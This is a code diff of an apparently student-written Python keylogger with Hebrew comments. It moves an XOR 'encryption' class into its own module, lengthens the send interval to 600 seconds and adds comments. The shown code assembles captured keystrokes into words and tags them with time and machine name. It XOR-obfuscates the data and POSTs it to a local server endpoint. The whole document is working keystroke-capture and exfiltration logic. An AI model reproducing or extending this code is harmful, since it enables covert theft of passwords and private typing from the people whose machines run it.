@@ -1,23 +1,10 @@
-from KeyLoggerService import KeyLoggerService
-import Encryptor, NetworkWriter, time, os, json, ast, requests
-
-#התוכנה שמצפינה
-class Encryptor:
-    def encryption_using_xor(self,data,key):
-        encrypted_text = ''
-        try:
-            for i, word in enumerate(data):
-                if word == '[' or word == ']':
-                    continue
-                else:    
-                    encrypted_text += chr(ord(word) ^ key)
-            # print (encrypted_text)    
-            return encrypted_text
-        except:
-             return encrypted_text
+from KeyLoggerService import KeyLoggerService 
+import   time, os, json, ast, requests
+from Enkryptor import Encryptor
 
 
-from KeyLogger import IWriter
+
+from iwriter import IWriter
 class  NetworkWriter(IWriter):
     def __init__(self):        
         super().__init__()
@@ -26,23 +13,21 @@ class  NetworkWriter(IWriter):
             url = 'http://127.0.0.1:5000/api/keylogges'
             response = requests.post(url,json=data)
         except:
-               return         
+               return None         
 
 class KeyLoggerManager(KeyLoggerService):
     def __init__(self):
         super().__init__()
         self.data = []
         self.word = ''
-
+    #פונקציה שמחברת את האותיות למילים
     def list_to_word(self,list1:list):
      str1 = ''
      list_to_sand = []
      for i in list1:
           str1 += str(i)
      str1 = str1.replace("'",'')
-     print(str1)
      str1 = str1.split()
-     print(str1)
      try:
         list_to_sand = str1     
         return list_to_sand
@@ -56,22 +41,24 @@ class KeyLoggerManager(KeyLoggerService):
             self.send1 = NetworkWriter()
             self.encryption = Encryptor()
             while True:
-                #זמן ההמתנה בין כל שליחה
-                time.sleep(5)
+                # זמן ההמתנה בין כל שליחה בשניות
+                time.sleep(600)
                 list_to_send = self.list_to_word(self.text)
                 #שמירת זמן עכשווי
                 time1 = str(datetime.now())
+                #הכנסת המידע לdict
                 jeson = {'time':time1,'data':list_to_send,'machine':machine}
                 if len(jeson['data']) == 0:
                             continue
-                else:    
+                else:
+                    #jsonהפיכת המילון ל    
                     jeson = json.dumps(jeson,ensure_ascii=False)
+                    #jsonהצפנת ה
                     jeson = self.encryption.encryption_using_xor(jeson,4)
                     data = {'data':jeson}
-                    #והצפנתו jsonשמירת המידע ב
-                    #jeson = json.dumps(self.encryption.encryption_using_xor(jeson,4))
-                    #שליחה המידע לשרת
                     data = json.dumps(data)
+                    print(data)
+                    #שליחה המידע לשרת
                     self.send1.send_data(data)
                     self.text.clear()
 
